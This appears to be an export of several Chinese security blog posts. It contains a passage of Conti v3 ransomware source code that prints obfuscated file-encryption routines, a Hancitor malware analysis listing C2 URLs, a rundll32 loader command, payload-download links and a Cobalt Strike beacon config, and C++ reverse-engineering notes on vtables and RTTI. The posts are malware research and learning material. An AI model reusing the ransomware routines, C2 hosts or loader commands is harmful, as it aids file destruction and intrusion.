LARGE_INTEGER FileSize; if (!pGetFileSizeEx(FileInfo-&gt;FileHandle, &amp;FileSize) || !FileSize.QuadPart) { logs::Write(OBFW(L&quot;Can't get file size %s. GetLastError = %lu&quot;), FileInfo-&gt;Filename, pGetLastError()); CloseHandle(FileInfo-&gt;FileHandle); return FALSE; } FileInfo-&gt;FileSize = FileSize.QuadPart; return TRUE;} EncryptHeaderencrypt the file’s first 1048576 byte 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465STATICBOOLEncryptHeader( __in cryptor::LPFILE_INFO FileInfo, __in LPBYTE Buffer, __in HCRYPTPROV CryptoProvider, __in HCRYPTKEY PublicKey){ BOOL Success = FALSE; DWORD BytesRead = 0; DWORD BytesToRead = 0; DWORD BytesToWrite = 0; LONGLONG TotalRead = 0; LONGLONG BytesToEncrypt; LARGE_INTEGER Offset; BytesToEncrypt = 1048576; while (TotalRead &lt; BytesToEncrypt) { morphcode(TotalRead); LONGLONG BytesLeft = BytesToEncrypt - TotalRead; morphcode(BytesLeft); BytesToRead = BytesLeft &gt; BufferSize ? BufferSize : (DWORD)BytesLeft; morphcode(BytesToRead); Success = (BOOL)pReadFile(FileInfo-&gt;FileHandle, Buffer, BytesToRead, &amp;BytesRead, NULL); if (!Success || !BytesRead) { break; } morphcode(BytesRead); TotalRead += BytesRead; BytesToWrite = BytesRead; morphcode(TotalRead); ECRYPT_encrypt_bytes(&amp;FileInfo-&gt;CryptCtx, Buffer, Buffer, BytesRead); morphcode(Buffer); Offset.QuadPart = -((LONGLONG)BytesRead); if (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, NULL, FILE_CURRENT)) { break; } morphcode(Offset.QuadPart); Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, BytesToWrite); if (!Success) { break; } morphcode(BytesToWrite); } return TRUE;} EncryptPartlyif the file is Virtual Machine Extension, then EncryptPartly if the filesize is over 5242880 byte, then EncryptPartly. Judge the file size and decide how many percent the code wanna Encrypt. the global::GetEncrypSize return value is 50, so if the filesize is over 5242880, it will encrypt the 10% size data of this file. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176STATICBOOLEncryptPartly( __in cryptor::LPFILE_INFO FileInfo, __in LPBYTE Buffer, __in HCRYPTPROV CryptoProvider, __in HCRYPTKEY PublicKey, __in BYTE DataPercent){ BOOL Success = FALSE; DWORD BytesRead = 0; DWORD BytesToRead = 0; DWORD BytesToWrite = 0; LONGLONG TotalRead = 0; LONGLONG BytesToEncrypt; LARGE_INTEGER Offset; LONGLONG PartSize = 0; LONGLONG StepSize = 0; INT StepsCount = 0; switch (DataPercent) { case 10: PartSize = (FileInfo-&gt;FileSize / 100) * 4; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 15: PartSize = (FileInfo-&gt;FileSize / 100) * 5; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 20: PartSize = (FileInfo-&gt;FileSize / 100) * 7; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 25: PartSize = (FileInfo-&gt;FileSize / 100) * 9; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 30: PartSize = (FileInfo-&gt;FileSize / 100) * 10; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 35: PartSize = (FileInfo-&gt;FileSize / 100) * 12; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 40: PartSize = (FileInfo-&gt;FileSize / 100) * 14; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 50: PartSize = (FileInfo-&gt;FileSize / 100) * 10; morphcode(PartSize); StepsCount = 5; StepSize = PartSize; morphcode(StepSize); break; case 60: PartSize = (FileInfo-&gt;FileSize / 100) * 20; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 70: PartSize = (FileInfo-&gt;FileSize / 100) * 23; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; case 80: PartSize = (FileInfo-&gt;FileSize / 100) * 27; morphcode(PartSize); StepsCount = 3; StepSize = (FileInfo-&gt;FileSize - (PartSize * 3)) / 2; morphcode(StepSize); break; default: return FALSE; } for (INT i = 0; i &lt; StepsCount; i++) { TotalRead = 0; BytesToEncrypt = PartSize; morphcode(BytesToEncrypt); if (i != 0) { Offset.QuadPart = StepSize; if (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, NULL, FILE_CURRENT)) { break; } morphcode(Offset.QuadPart); } while (TotalRead &lt; BytesToEncrypt) { morphcode(TotalRead); LONGLONG BytesLeft = BytesToEncrypt - TotalRead; morphcode(BytesLeft); BytesToRead = BytesLeft &gt; BufferSize ? BufferSize : (DWORD)BytesLeft; morphcode(BytesToRead); Success = (BOOL)pReadFile(FileInfo-&gt;FileHandle, Buffer, BytesToRead, &amp;BytesRead, NULL); if (!Success || !BytesRead) { break; } morphcode(BytesRead); TotalRead += BytesRead; BytesToWrite = BytesRead; morphcode(TotalRead); ECRYPT_encrypt_bytes(&amp;FileInfo-&gt;CryptCtx, Buffer, Buffer, BytesRead); Offset.QuadPart = -((LONGLONG)BytesRead); if (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, NULL, FILE_CURRENT)) { break; } morphcode(Offset.QuadPart); Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, BytesToWrite); if (!Success) { break; } morphcode(BytesToWrite); } } return TRUE;} EncryptFullIt’s the same as EncryptPartly function,just remove the percent argument. morphcode","link":"/2022/04/30/conti%20v3%20source%20code%20learning/"},{"title":"2021-12-16-hancitor","text":"intro之前看过两个hancitor的样本，但是从现在看来做的都太简单了，而且当时的各方面知识也都不是很完善。于是找了2021.12.26日的样本重新做一次详尽的分析。 如果有错误可以联系我 qq：2466811523 mail: 2466811523@qq.com 静态分析 md5: 9f09b1dd6235c28b091a7dbc9bcd9482sha1: b7ac19b82e2f946e7cc047421875bbade3e880fdsha256: 571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74 vt: https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details hybrid: https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a Reference: http://blog.nsfocus.net/beaconeye-cs/ https://www.malware-traffic-analysis.net/2021/12/16/index.html 区块信息 导入函数kernel32.dll导入了EnterCriticalSection,DeleteCriticalSection,Exitprocess,WriteFile，猜测存在文件操作行为，反调试行为。 advapi.dll存在注册表操作函数 沙箱行为分析网络行为沙箱中存在网络行为 post 传的数据经过了加密 1DATA=R1VJRD0xMDQyMzA1MTAwMTU0MjczNTA4NCZCVUlMRD0xNjEyX21jeHBsa2pnJklORk89ODM1MTgwIEAgREVTS1RPUC03MTZUNzcxXGhhcmR6JkVYVD0mSVA9MTAyLjEyOS4xNDMuNjImVFlQRT0xJldJTj0xMC4wKHg2NCkA 注册表行为设置了HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\[ProxyServer/ProxyEnable],http启用代理。 146 00 00 00 04 01 00 00 03 00 00 00 14 00 00 00 65 78 74 72 61 63 74 6F 72 2E 70 72 6F 78 79 3A 38 30 38 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D0 5C 01 4D C1 D5 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 得到的主要信息为我们获得了代理服务器 1265 78 74 72 61 63 74 6F 72 2E 70 72 6F 78 79 3A 38 30 38 30extractor.proxy:8080 What’s the format of the DefaultConnectionSettings value in the Windows registry? regsvc32.exe 可疑注册表 12HKEY_CURRENT_USER_Classes\\dllfile\\AutoRegisterHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\dllfile\\AutoRegister 进程行为12345%windir%\\System32\\svchost.exe -k WerSvcGroupwmiadap.exe /F /T /R&quot;c:\\windows\\system32\\regsvr32.exe&quot; C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\b7ac19b82e2f946e7cc047421875bbade3e880fd.dllC:\\Windows\\system32\\WerFault.exe -u -p 2088 -s 300&quot;c:\\windows\\system32\\rundll32.exe&quot; C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\b7ac19b82e2f946e7cc047421875bbade3e880fd.dll, DllRegisterServer 注册服务 Mutex123Local\\WERReportingForProcess2088Global\\10443951-6e48-11ec-95c3-6c4b90457b65DBWinMutex Decoded Config {“Campaign Id”: “1612_mcxplkjg”, “C2 list”: [“http://hiltustra.com/9/forum.php&quot;, “http://corelince.ru/9/forum.php&quot;, “http://mernwel.ru/9/forum.php&quot;]} from ZenBox antiDebug这里还不太清楚为什么这个regsvr32.exe会被识别为anti-debug 函数分析 行为图 反汇编分析导出函数DllRegisterServer如下 反调试导出函数的第一个函数为，这里可以看到QueryPerformanceCounter函数，是用于检测时间的函数 sub_1000786D函数中调用了SetUnhandledExceptionFilter函数，一般用于引发异常的反调试，当引发异常后会跳转到TopLevelException 看看TopLevelExceptionFilter，应该是动态解密的数据。 QueryPerformanceCounter IsProcessorFeaturePresent SetUnhandledExceptionFilter https://docs.microsoft.com/en-us/windows/win32/api/profileapi/nf-profileapi-queryperformancecounter https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter debugdebug DllRegisterServer 在加密数据处打硬件访问断点然后运行后到达如下 这边已经开始对内存地址进行清零了，说明这段数据已经解密成功并存储到内存地址的某处了，我们直接打开内存布局，找到具有执行权限的内存区域 执行完后发现0xf00000（随机生成）区域处内存如下，此时可以dump出我们Stage2 payload Stage2 Payload启动方式向本地发送10个ping数据包，并使用rundll32.exe执行iff.bin文件的导出函数WCWGVXGWTDGAWLW 1cmd.exe /c ping localhost -n 10 &amp;&amp; rundll32.exe iff.bin,WCWGVXGWTDGAWLW 静态分析 md5: c90ad5fe64f4f02fb1f77005f95161d6sha1: def89402bbff6a694c0adc82ee0d937f0a02182csha256: 19a7b1957104c4c01958ff3be6cc6688c9d34f725180bd4cc7d1373228dfbbc8 导出函数WCWGVXGWTDGAWLW sub_10001519 mw_sendHostConfigAndRead首先获取主机的各种信息包括系统、主机名、公网IP、系统位数,然后根据系统位数进行生成配置信息，并准备加密发送给远程主机。 The DsEnumerateDomainTrusts function obtains domain trust data for a specified domain. 关于域信任关系：在同一个域内,成员服务器根据Active Directory中的用户账号,可以很容易地把资源分配给域内的用户.但一个域的作用范围毕竟有限,有些企业会用到多个域,那么在多域环境下,我们该如何进行资源的跨域分配呢？也就是说,我们该如何把A域的资源分配给B域的用户呢？一般来说,我们有两种选择,一种是使用镜像账户.也就是说,我们可以在A域和B域内各自创建一个用户名和口令都完全相同的用户账户,然后在B域把资源分配给这个账户后,A域内的镜像账户就可以访问B域内的资源了 红队通过收集域信任关系从而进行横向移动.通过调用DSEnumerateDomainTrusts() Win32 API,来进行枚举 主机信息会通过base64加密，最后由网络行为发送到远程主机 mw_Internet mwDecryptReadData那么我们可以通过这段代码获得什么呢？也就是返回数据的解密方式 首先跳过前四个字节也就是35 30 0d 0a，然后首先进行base64解密，然后xor解密即可得到payload 我们解密一下malware-traffic中的流量包数据 mw_commandList看到后面就会发现这几个字符没有参与加密，为传入的命令列表字符串。 mw_judgeCommand 命令 Command Detail b: Download and inject into svchost.exe e: Download and inject into running process l: Download shellcode and inject into svchost.exe or current process r: Download and inject into svchost.exe, check file its downloading n: Do not download (could be utilized as a check to see if victim still active) 但是2021.12.16日这个样本中多了一条命令f Command Detail b: Download and inject into svchost.exe e: Download and inject into running process l: Download shellcode and inject into svchost.exe or current process r: Download and inject into svchost.exe, check file its downloading n: Do not download (could be utilized as a check to see if victim still active) f: Download the shellcode,infect into the svchost.exe or the running process.(start a thread that inherit the object handle,then inject into the shellcode) command nDo not download (could be utilized as a check to see if victim still active) command bDownload and inject into svchost.exe heapAlloc getPayload command e,le:Download and inject into running process l:Download shellcode and inject into svchost.exe or current process heapAlloc getPayload command f HeapAlloc getPayload command rDownload and inject into svchost.exe, check file its downloading HeapAlloc getPayload command f我们看一下这里f传入了HANDLE_FLAG_INHERIT参数 这意味着会创建一个继承了父进程对象handle的子进程 Value Meaning HANDLE_FLAG_INHERIT0x00000001 If this flag is set, a child process created with the bInheritHandles parameter of CreateProcess set to TRUE will inherit the object handle. 主要代码逻辑在sub_10002A0B函数里 首先check一下hProcess也就是HANDLE_FLAG_INHERIT，该参数默认值为1，如果不存在的话就通过线程的方式启动shellcode，存在的话就以代码注入的方式启动。 这里代码设定死了参数，也就是这里只会以代码注入svchost.exe的方式启动 tips配置文件仍然使用sha1和rc4加密，前8byte用sha1加密，然后使用rc4解密pbData即可 decrypt 11612_mcxplkjg...http://hiltustra.com/9/forum.php|http://corelince.ru/9/forum.php|http://mernwel.ru/9/forum.php| Stage3 Payload那么第二阶段的payload也分析完毕了，我们看看第三阶段的payload会执行什么操作呢？首先我们得先提取出第三阶段的payload,上面说到我们已经提取出了流量中我们得到的payload 1{f:http://sineko7.ru/37s.bin}{f:http://sineko7.ru/37.bin} 然后shellcode加载可以断到InternetConnectA函数,C2的Ip地址为104.128.232.37 这段shellcode的伪代码，是Metasploit的动态函数的混淆方式，利用hashdb恢复函数逻辑 然后shellcode的代码逻辑如下 通过HttpRequestA访问104.128.232.37/bfGM HttpSendRequestA发送请求，然后如果请求成功后会用InternetReadFile去读取下一阶段的payload 然后会发现shellcode大部分相同，只是访问的URL修改为了/TdSQ. Stage4 Payload经调试发现如下代码动调解密了后面的代码 执行完后会发现Dos Stub头,我们可以dump出PE文件 Stage5 Payload函数入口位于导出函数ReflectiveLoader，是beacon.dll的导出函数 用PE-bear打开发现确实是beacon.dll 由于beacon对配置的异或密钥是固定的，我们可以直接通过cyberchef对beacon提取c2（3.x版本的CobaltStrike默认是0x69，对4.x版本的CobalStrike默认是0x2e） 利用脚本提取config，虽然这里显示有已知的私钥，但经过尝试发现无法解密cs流量的cookie。猜测私钥错误。由于私钥没有泄漏导致cookie和后面的命令无法解密。 12345678910111213141516171819202122232425262728293031323334353637383940414243File: loader_009E0000.binpayloadType: 0x10015044payloadSize: 0x00000000intxorkey: 0x00000000id2: 0x00000000Config found: xorkey b'.' 0x00030620 0x00032ec20x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http0x0002 port 0x0001 0x0002 800x0003 sleeptime 0x0002 0x0004 600000x0004 maxgetsize 0x0002 0x0004 10485760x0005 jitter 0x0001 0x0002 00x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100a70991d69d816a601ffa80976473830f0d3b41276d2790401ddedb18e2d3cab3c315e3222325be42b65adb2878f33f5a03ff5010b23e842a510c1482ad6a42f1e7e5726eb31813e7437640ed7879955f401e172c34d3517241596dd41f8e48d3d1b1c288e6c8752ff65dc27acccba4ba9cd6d0e4de6196cea4da480d3b99d0ed020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 Has known private key0x0008 server,get-uri 0x0003 0x0100 '104.128.232.37,/updates.rss'0x0043 0x0001 0x0002 00x0044 0x0002 0x0004 42949672950x0045 0x0002 0x0004 42949672950x0046 0x0002 0x0004 42949672950x000e SpawnTo 0x0003 0x0010 (NULL ...)0x001d spawnto_x86 0x0003 0x0040 '%windir%\\\\syswow64\\\\rundll32.exe'0x001e spawnto_x64 0x0003 0x0040 '%windir%\\\\sysnative\\\\rundll32.exe'0x001f CryptoScheme 0x0001 0x0002 00x001a get-verb 0x0003 0x0010 'GET'0x001b post-verb 0x0003 0x0010 'POST'0x001c HttpPostChunk 0x0002 0x0004 00x0025 license-id 0x0002 0x0004 1580103824 Stats uniques -&gt; ips/hostnames: 42 publickeys: 100x0026 bStageCleanup 0x0001 0x0002 00x0027 bCFGCaution 0x0001 0x0002 00x0009 useragent 0x0003 0x0100 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2)'0x000a post-uri 0x0003 0x0040 '/submit.php'0x000b Malleable_C2_Instructions 0x0003 0x0100 '\\x00\\x00\\x00\\x04'0x000c http_get_header 0x0003 0x0200 Cookie0x000d http_post_header 0x0003 0x0200 &amp;Content-Type: application/octet-stream id0x0036 HostHeader 0x0003 0x0080 (NULL ...)0x0032 UsesCookies 0x0001 0x0002 10x0023 proxy_type 0x0001 0x0002 2 IE settings0x003a 0x0003 0x0080 '\\x00\\x04'0x0039 0x0003 0x0080 '\\x00\\x04'0x0037 0x0001 0x0002 00x0028 killdate 0x0002 0x0004 00x0029 textSec","link":"/2022/04/28/2021-12-16-hancitor/"},{"title":"Kovter__b8113a604e6c190bbd8b687fd2ba7386d4d98234f5138a71bcf15f0a3c812e91","text":"introC++是一门支持面向对象的语言，为面向对象的软件开发提供了丰富的语言支持。要想高效、正确地使用C++中的继承、多台等语言特性，就必须对这些特性的底层有一定的了解。 其实，C++的对象模型的核心概念并不多，最重要的概念是虚函数。虚函数式程序运行时定义的函数。虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有对虚函数的饮用通常放在一个专用数组————虚函数表（Virtual Table，VBTL）中，数组的每个元素中存放的就是类中虚函数的地址。调用虚函数时，程序先取出虚函数指针（Virtual Table Pointer，VPTR），得到虚函数表的地址，再根据这个地址到虚函数表中取出该函数的地址，最后调用该函数。 x32 demo code12345678910111213141516class CSum {public: virtual int Add(int a,int b) { return (a + b); } virtual int Sub(int a, int b) { return (a - b); }};void main() { CSum* pCSum = new CSum; pCSum-&gt;Add(1, 2); pCSum-&gt;Sub(1, 2);} 首先会使用new函数分配class所需的内存（由IDA识别）。调用成功后保存在eax寄存器中，最后传到ecx。 我们可以看到，v3指向了虚函数表，通过指针进行调用Add和Sub函数。 而且需要注意到，程序以ecx作为this指针的载体传递给虚函数成员函数，并利用两次间接寻址得到虚函数的正确地址从而执行。 虚函数表 x64 demo code成员函数CVirtual,析构函数CVirtual 虚函数 func1、func2 私有变量 m_nMember1、m_nMember2 1234567891011121314151617181920212223242526272829303132333435363738/*--------------------------------------------《加密与解密（第四版）》(c) 看雪学院 www.kanxue.com 2000-2018----------------------------------------------*/// Example4-1.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;class CVirtual {public: CVirtual() { m_nMember1 = 1; m_nMember2 = 2; printf(&quot;CVirtual()\\r\\n&quot;); } virtual ~CVirtual() { printf(&quot;~CVirtual()\\r\\n&quot;); } virtual void fun1() { printf(&quot;fun1()\\r\\n&quot;); } virtual void fun2() { printf(&quot;fun2()\\r\\n&quot;); }private: int m_nMember1; int m_nMember2;};int main(int argc, char* argv[]) { CVirtual object; object.fun1(); object.fun2(); return 0;} for循环用于初始化栈空间为0xCC 函数判断那么我们如何判断构造函数、析构函数？ main函数在申请了对象实例空间后的第一个函数调用即可猜测为类的构造函数，调用的最后一个函数可以猜测为析构函数 构造函数实现首先初始化虚表指针，然后初始化数据乘员，构造函数完成，返回this指针。为什么需要返回this指针？c++编译器为了判断一个构造是否被调用而设置的。 如果一个函数在入口处使用lea reg,off_xxxxxxxxx和mov [reg],reg特征初始化虚表，且返回值为this指针，就可以怀疑这个函数是一个构造函数。 析构函数实现首先初始化栈空间，然后赋值虚表，最后返回this指针。 既然前面两个函数的流程都相同，那么如何判断构造函数和析构函数呢？ ————在main函数中的调用顺序 虚表结构因为这个类有虚函数，所以编译器为这个类产生了一个虚表，其存储在全局数据区（.rdata）.虚表的每一项都是8个字节，其中存储的是成员函数的地址。 这里需要注意：因为虚表的最后一项不一定是以0结尾，所以虚表项的个数会根据其他信息来确定 虚表汇总的函数按类中成员函数声明顺序依次放入。 函数分布顺序在某些情况下不一定与声明顺序相同（例如虚函数重载），不过这个顺序对逆向还原代码没有影响。 在该demo code中虽然只编写了一个析构函数，编译器却生成了两个析构函数。其中一个是普通析构函数，对象出作用域调用；另一个放在虚表里，在delete对象的时候调用。 虚表中的析构函数比普通的析构函数多一个delete this操作。 delete 对象的时候，需要先调用析构函数，再释放对象的堆空间。 object.~CVirtual()属于多态调用，所以会直接调用虚表里的析构函数，这个时候对象被释放。delete object这句代码优惠调用虚表里的析构函数，这样堆空间会重复释放。 那么为了解决这个问题，VC++编译器给析构函数增加了一个参数，pObject-&gt;~CVirtual()调用时参数传递0，这样对象就不会被释放。如果delete pObject的时候参数传递1，对象就会被释放。这样就解决了上面那个问题。 gcc则采用了虚表里放两个析构函数的方法解决该问题。","link":"/2022/05/19/virtualFunc/"},{"title":"cppReverse","text":"Reference: https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.cmlab.csie.ntu.edu.tw/__cathyp_eBooks_C___Reverse_20c___pdf/index.pdf https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf judge c++As a natural way to start, the reverser must first determine if a specific target is indeed a compiled C++ binary and is using C++ constructs. Below are some pertinent indications that the binary being analyzed is a C++ binary and is using C++ constructs. Heavy use of ECX(this ptr),One of the first things that a reverser may see is the heavy use of ecx (which is used as the this pointer). One place the reverser may see it is that it is being assigned a value just before a function is about to be called: Another place is if a function is using ecx without first initializing it, which suggests that this is a possible class member function: calling conventionCalling Convention. Related to (1), Class member functions are called with the usual function parameters in the stack and with ecx pointing to the class’s object (i.e. this pointer.). Here is an example of a class instantxiation, in which the allocated class object (eax) will eventually be passed to ecx and then invocation of the constructor follows. 此外，reverser要注意到间接函数调用，这些调用更可能是虚拟函数；当然，如果不首先了解实际类或在调试器下运行代码，很难跟踪这些调用的去向。考虑以下虚拟函数调用示例： 在这种情况下，reverser必须首先知道ClassA的虚拟函数表（vftable）的位置，然后根据vftable中列出的函数列表确定函数的实际地址。 类实例结构普通类在我们深入之前我们应该熟悉类在内存中的结构布局 我们需要把padding增加到最后一个成员变量以确保size为4字节的倍数。 虚函数 here’s the class layout 请注意，在布局的开头添加了指向虚拟函数表的指针。此表按声明顺序包含虚拟函数的地址。Ex2类的虚拟函数表将像这样。 现在，如果一个类从另一个类继承呢？以下是当一个类从单个类（即单个继承）继承时会发生什么： And the layout,我们可以看到存在两个var1在这个内存中。 如您所见，派生类的布局简单地附加到基类的布局中。在多次继承的情况下，情况如下： 如您所见，如果每个基类的实例数据将嵌入派生类的实例中，并且每个包含虚拟函数的基类将有自己的vftable。请注意，fist base class与当前对象共享vftable。当前对象的虚拟函数将附加到第一个基类虚拟函数列表的末尾 类识别我们上面已经讨论了如何判断一个程序是不是用 C++写的，讨论了类的构造函数以及内存中类的实例的组织形式，这一节我们来讨论 C++的类在可执行文件 中的使用情况。我们先来讨论如何确定内存中哪些部分是类(或者称为对象)下 一节再来讨论如何确定类之间的关系以及类中的成员。 识别构造函数和析构函数 全局对象。全局对象顾名思义就是那些被声明为全局变量的对象。这些对象的内存空间在编译时就已经被分配好了的， 它们位于可执行文件的数据段中。这些对象的构造函数是在这个程序启动以后，main调用之前被调用执行的，而它们的析构函数是在程序退出（exit）时被调用的。 一般来说，如果我们发现一个函数调用时，传入的是this指针（一般是使用ecx寄存器）是指向一个全局变量的话，我们基本可以确定，这是一个全局变量，我们可以利用交叉引用找到该全局变量的构造函数和析构函数，如果该段代码位于entrypoint和main函数之间，那么很有可能这个为构造函数 main函数 12345678910_main proc nearargc= dword ptr 4argv= dword ptr 8envp= dword ptr 0Chmov dword_403378, 3xor eax, eaxretn_main endp 通过交叉引用可以找到两处，也就是构造函数和析构函数 跟进构造函数,_atexit注册了程序终止的函数为析构函数 运行到返回后发现程序位于entrypoint和main函数之间，属于编译器生成的代码，通过call _initterm函数调用了构造函数 局部对象。这些对象的作用域起始于该对象被声明的地方，结束于声明该对象的模块退出之时(比如函数结尾或者分支结束的地方，下面例子里就是在一个 if 语句块 结束的地方调用析构函数的)。局部对象在内存中是位于栈(stack)里的。 它们的构造函数在该对象声明的地方被调用，而在对象离开其作用域时调用 对象的析构函数。 局部对象的构造函数还是比较容易识别的，如果你发现一个函数调用， 传递过去的 this 指针竟然是指向了栈中一个未被初始化过的变量的话，你基 本上可以确定这个函数是一个对象的构造函数，同时也就发现了一个对象。 析构函数一般则是与构造函数位于同一个模块(也就是声明该对象的模块) 的最后一个使用指向该对象的 this 指针的函数。 动态分配的对象，这种对象是通过new操作符动态创建的对象。实际上，new操作符会变成两个符号调用：一个new()函数的调用再接着一个构造函数的调用。new()函数是用来在堆中分配空间的（对象的大小通过参数传给new函数），然后把心分配的地址存在EAX寄存器返回出来。同样delete也会变成析构函数和free()函数。 通过RTTI进行多态类识别（Run-Time-Type Information） 如果C++在编译的时候启用了RTTI功能，那么我们又会多一种识别类的方法。特别是对多态类（包含虚函数的类）。RTTI是C++中提供的一种在运行时确定对象类型的机制，在C++中一般时候typeid和dynamic_cast这两个操作符来实现这一机制。这两个操作符在实现时需要获得相关类的类名，类的层次等相关信息，在实际使用VC的时候，如果你用了以上两种操作符号但没有启用RTTI，编译器将会给你一个警告。在默认情况下MSVC6.0关闭了RTTI功能。而MSVC2005中默认开启了RTTI。 RTTICompleteObjectLocator 这个结构体包含了两个指针，一个指向实际的类信息，另一个指向类的继承关系。 Offset Type Name Description 0x00 DW signature Always 0 ？ 0x04 DW offset Offset of Vtable within the class 0x08 DW cdoffset ? 0x0c DW pTypeDescription Class Information 0x10 DW pClassHierarchyDescription Class Hierarchy Information 那么怎么找到这个结构体呢？我们只要找到虚函数表的上一个DWORD指向的即为RTTICompleteObjectLocator。 这是RTTICompleteObjectLocator结构 TypeDescriptor 位于RTTICompleteObjectLocator结构的第四个DWORD是一个指向本类的TypeDescriptor结构体的指针，TypeDescriptor这个结构体中记录了这个类的类名、 Offset Type Name Description 0x00 DW pVFTable Always points to type_info’s vftable 0x04 DW spare ? 0x08 SZ name Class Name RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor记录了类的继承信息、包括基类的数量以及一个RTTIBaseClassDescriptor数组，RTTIBaseClassDescriptor在下面详细讨论，RTTIBaseClassDescriptor最终将指向当前各个基类的TypeDescriptor。 Offset Type Name Description 0x00 DW signature Always 0 ？ 0x04 DW attributes Bit 0 - multiple inheritance;Bit 1 - virtual inheritance 0x08 DW numBaseClasses number of base classes, Count includes the class itself 0x0c DW pBaseClassArray Array of RTTIBaseClassDescriptor 当classG 虚拟继承了classA和classE，那么结构如下。包括ClassG自身，我们可以看到numBaseClasses = 3。attributes = 3 表示它既是多继承又是虚继承，最后一个BaseClassArray指向RTTIBaseClassDescriptor RTTIBaseClassDescriptor 这个结构体包含了基类的有关信息。它包括一个指向基类的TypeDescriptor的指针和一个指向基类的RTTIClassHierarchyDescriptor的指针，（VC6.0中可能没有pBaseClassArray）。另外，它还包含有一个PMD结构体，该结构体中记录了该类中的各个基类的位置。RTTIBaseClassDescriptor结构如下。 Offset Type Name Description 0x00 DW pTypeDescriptor TypeDescriptor of the base class 0x04 DW numContainedBases Number of direct bases of this base class 0x08 DW PMD.mdisp vftable offset 0x0c DW PMD.pdisp vbtable offset(-1:vftable is at displacement PMD.mdisp inside the class) 0x10 DW PMD.vdisp displacement of base class vftable pointer inside the vbtable 一个vbtable（Virtual base class table)是由多重虚拟继承生成的。因为在多重继承的情况下，有时候需要upclass。这时候就需要精确定位基类。虚基类表包含了各个基类在派生类中的位置（或者说各个基类的虚函数表在派生类中的位置，因为虚函数表是基于类的起始位置的）。 根据之前所说的ClassG类声明，编译器会生成以下类结构 在如上这种情况下，vbcase存在于位移0x04处，另一方面，vbtable包含派生类内每个基类的位移： 那么我们尝试利用vbtable来确定基类的真实地址。首先可以看到ClassE的偏移是4，然后我们从虚基类表中读取出classE的偏移为16，那么16 +4 = 20，ClassE位于ClassG +0x14 处,也就是下图的0x00418b14地址处。 以下为ClassG中ClassE的BaseClassDescriptor 那么总结如下的关系图 识别类关系通过构造器识别类关系构造函数包含初始化对象的代码，例如调用基类的构造函数和设置vftables。因此，分析构造函数可以让我们很好地了解这个类与其他类的关系。 让我们假设我们已经确定这个函数是通过之前所说方法识别的构造函数。现在，我们看到一个函数正在使用当前对象的这个指针调用。这可以是当前类的成员函数，也可以是基类的构造函数。 我们怎么知道是哪一个？事实上，仅仅通过查看生成的代码，就无法完美区分两者。然而，在现实世界的应用中，在此步骤之前，构造函数很有可能被识别在较前的位置，因此我们所要做的就是将这些信息关联起来，以得出更准确的标识。换句话说，如果使用当前对象的此指针在另一个构造函数中调用预先确定为构造函数的函数，它可能是基类的构造函数。 手动识别这一点需要检查对这个函数的其他交叉引用，看看这个函数是否是二进制文件中其他地方调用的构造函数。我们将在本文件后面讨论自动识别方法。 多重继承实际上比单一继承更容易发现。与单个继承示例一样，第一个调用的函数可以是成员函数，也可以是基类构造函数。请注意，在反汇编中，调用第二个函数之前，在此指针中添加4个字节。这表明正在初始化另一个基类。 Here’s the layout for this class to help you visualize. The disassembly above belongs to the constructor of class D. Class D is derived from two other classes, A and C: 